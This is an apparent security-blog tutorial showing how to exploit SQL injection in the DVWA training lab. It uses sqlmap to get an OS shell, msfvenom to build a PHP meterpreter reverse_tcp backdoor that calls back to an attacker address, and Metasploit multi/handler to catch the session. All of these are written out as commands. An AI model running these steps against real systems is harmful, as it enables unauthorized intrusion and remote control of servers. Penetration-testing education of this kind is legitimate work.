@@ -1,0 +1,91 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/database-hacking/" rel="category tag">Database Hacking</a>, <a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">Shell uploading in Web Server using Sqlmap</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/shell-uploading-in-web-server-using-sqlmap/" rel="bookmark"><time class="entry-date published" datetime="2017-01-06T05:17:09+00:00">January 6, 2017</time><time class="updated" datetime="2025-05-27T12:03:58+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hey Guys!! You may have used sqlmap multiple times for SQL injection to get database information of the web server. Here in this tutorial, I will show you “how to upload any backdoor to get meterpreter session” if the website is suffering from SQL vulnerability.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;">DVWA Lab Set-Up</span></li>
+<li><span style="color: #000000;">Navigate to page Vulnerable to SQL injection</span></li>
+<li><span style="color: #000000;">Intercept the Browser Request (Burp-suite)</span></li>
+<li><span style="color: #000000;">Save Intercept data in a text file</span></li>
+<li><span style="color: #000000;">Extracting database name (SQLMAP)</span></li>
+<li><span style="color: #000000;">Spawning os-shell (SQLMAP)</span></li>
+<li><span style="color: #000000;">Explore file Stager in the browser</span></li>
+<li><span style="color: #000000;">Generating PHP backdoor (msfvenom)</span></li>
+<li><span style="color: #000000;">Run Multi-handler (Metasploit)</span></li>
+<li><span style="color: #000000;">Upload Msfvenom PHP Backdoor and execute</span></li>
+<li><span style="color: #000000;">Obtain Meterpreter Shell</span></li>
+</ul>
+<h3><span style="color: #800000;">DVWA Lab Set-Up</span></h3>
+<ul>
+<li><span style="color: #000000;">Requirement:</span></li>
+<li><span style="color: #000000;">Xampp/Wamp Server</span></li>
+<li><span style="color: #000000;">DVWA web vulnerable application</span></li>
+<li><span style="color: #000000;">Kali Linux: Burp suite, sqlmap tool</span></li>
+</ul>
+<p><span style="color: #000000;">Firstly, you need to install DVWA lab in your XAMPP or WAMP server, read the full article from<strong> here</strong></span></p>
+<h3><span style="color: #800000;">Navigate to Page Vulnerable to SQL Injection</span></h3>
+<p><span style="color: #000000;">Now let’s navigate to DVWA through a web browser and log in with following credentials:</span></p>
+<p><span style="color: #000000;"><strong>Username</strong> – admin</span></p>
+<p><span style="color: #000000;"><strong>Password</strong> – password</span></p>
+<p><span style="color: #000000;">Click on <strong>DVWA Security</strong> and set Website <strong>Security Level low</strong></span></p>
+<p><span style="color: #000000;">From the list of vulnerability select SQL Injection for your attack. Type <strong>user ID: 1</strong> in the text box.  Don’t click on submit button without setting web browser proxy. Set your browser proxy to make burp suite work properly.  </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-kXXSYG9-2hQ/W_7YAE9VXnI/AAAAAAAAbgA/foglFleIvmwJNOYRgo0D6oDNsS0GehtTwCLcBGAs/s1600/1.png"/></span></p>
+<p> </p>
+<h3><span style="color: #800000;">Intercept the Browser Request</span></h3>
+<p><span style="color: #000000;">Now let’s intercept the browser request with the following steps:</span></p>
+<ul>
+<li><span style="color: #000000;">After setting Network Proxy in the web browser then turn on burp suite.</span></li>
+<li><span style="color: #000000;">Click on <strong>the proxy</strong> in the menu bar then go for <strong>intercept</strong> is on the button.</span></li>
+<li><span style="color: #000000;">Come back and click on submit button in dvwa.</span></li>
+<li><span style="color: #000000;">Copy the intercepted data and save in a text file.</span></li>
+</ul>
+<p><span style="color: #000000;">The Intercept button is used to display HTTP and Web Sockets messages that pass between your browser and web servers. Burp suit will provide” cookie” and “referrer” under fetched data which can be used in sqlmap commands directly.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-9x1vwvud5ZU/W_7YA08bHuI/AAAAAAAAbgM/NRwc4x7gWxsY23EIgRCwNeFWw9T_SkYgwCLcBGAs/s1600/2.png"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Extracting Database Name</span> </span></h3>
+<p><span style="color: #000000;">Now use sqlmap for SQL injection and run the following command to enumerate database name.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r file --dbs --batch</pre>
+<p><span style="color: #000000;">Here –<strong>r option </strong>uses to analyze HTTP request from “file” and as you can observe it has to dump <strong>DVWA</strong> as the database name.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-y9sjQ36zsG8/W_7YBA4--zI/AAAAAAAAbgQ/9tkXi3mKpxMATymiWSnScW9ZjH8ZtGOjACLcBGAs/s1600/3.png"/></span></p>
+<h3><span style="color: #800000;">Spawning os-shell</span></h3>
+<p><span style="color: #000000;">Now Type the following command to run sqlmap to access os-shell of the web server (dvwa)</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sqlmap -r file -D dvwa --os-shell</pre>
+<p><span style="color: #000000;">It will try to generate a backdoor; if you want to upload PHP backdoor inside the web server then <strong>type 4</strong> for <strong>PHP</strong> payload.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-uW9r8UU1pUM/W_7YBY_VWkI/AAAAAAAAbgU/NGU01e-uV1ESh_QiGaNu_DgZof8pH0yNACLcBGAs/s1600/4.png"/></span></p>
+<p><span style="color: #000000;"><strong>Type 4 </strong>for brute force search to use as a writable directory to upload it.</span></p>
+<p><span style="color: #000000;">It is trying to upload the file on “/xampp/htdocs/” by using SQL injection techniques. As soon as the file is uploaded; it will send INFO “<em>the file stager has been successfully uploaded on /xampp/htdocs/</em>”and you will get os-shell of victim pc. Other than here it also shows the path of file stager where you can manually upload your backdoor, look at over highlighted URL:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://192.168.1.105:80/tmpurufu.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-oZbBJ0rqs1Y/W_7YBvB7XZI/AAAAAAAAbgY/dfYfjKglJxMTIGblAn1YWzH4xnIXYUhKACLcBGAs/s1600/5.png"/></span></p>
+<h3><span style="color: #800000;">Explore File Stager in the Browser</span></h3>
+<p><span style="color: #000000;">Explore the URL<strong>:http://192.168.1.105/tmpurufu.php</strong> in the browser. From the given below screenshot, you can read the heading of the web page “<em>sqlmap file uploader</em>” which will let you browse your backdoor on the web server(dvwa) and later we can upload that backdoor at /xampp/htdocs/ directory of the web server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-uDewHxox8cQ/W_7YB716RuI/AAAAAAAAbgc/QAcDO0_sJYIyWZcbDz71ssLNgFZaB0erQCLcBGAs/s1600/6.png"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Generating PHP Backdoor</span> </span></h3>
+<p><span style="color: #000000;">Let’s prepare the malicious php file with msfvenom that we can upload:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.109 lport=4444 -f raw</pre>
+<p><span style="color: #000000;">Copy the code from &lt;?php to die() and save it in a file with .php extension. I have saved the backdoor as <strong><em>shell.php</em></strong> on the desktop and will later browser this file to upload on the web server. On other hand load the Metasploit framework by typing <strong>msfconsole</strong> and start <strong>multi/handle.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-CmtU9b_zPbM/W_7YCRCwPVI/AAAAAAAAbgk/QZgr8m6gWT4hWQqagq0LVXP3VpwkUUMfgCLcBGAs/s1600/7.png"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Upload &amp; Execute Msfvenom PHP Backdoor</span> </span></h3>
+<p><span style="color: #000000;">Click on <strong>browse tab </strong>to select your backdoor file <strong>(shell.php)</strong> file and then click on <strong>upload.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LlyzwgqoPoY/W_7YCK0-abI/AAAAAAAAbgg/5JILunCmFuEXdA4HiLPRgQQpqg3y6rJpgCLcBGAs/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">GREAT!!!  Here it shows Admin File is uploaded which means backdoor shell.php is uploaded.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-O0bc2N4Hg4Q/W_7YCZljS9I/AAAAAAAAbgo/S1N7ELlFGDwM51-g9hwJGdriPSRswyFXwCLcBGAs/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Then, to execute the backdoor file on the target machine, run URL:<strong><em>192.168.1.105/shell.php</em></strong> in the browser and you will receive reverse connection through multi/handler.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-OwtQqzzW9Qs/W_7YAJyUzoI/AAAAAAAAbgE/BHm5MEflaK8VWiTmgXXtzMpJTIFIcgGsQCLcBGAs/s1600/10.png"/></span></p>
+<h3><span style="color: #800000;">Obtain Meterpreter Shell</span></h3>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf&gt; use multi/handler
+msf exploit(handler) &gt; set lport 4444
+msf exploit(handler) &gt; set lhost 192.168.1.109
+msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp
+msf exploit(handler) &gt; exploit</pre>
+<p><span style="color: #000000;"><strong>Divine!!! </strong> Here we have got our meterpreter session 1.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HMEVATfHEnU/W_7YAKjm_0I/AAAAAAAAbgI/zACpVhItuxU8fZrLcFKp7oiD2yi49f1RwCLcBGAs/s1600/11.png"/></span></p>
+<p><span style="color: #000000;">To learn more about Database Hacking. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/database-hacking/">Link.</a></strong></p>
+<p><span style="color: #000000;"><strong>Author: </strong>Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
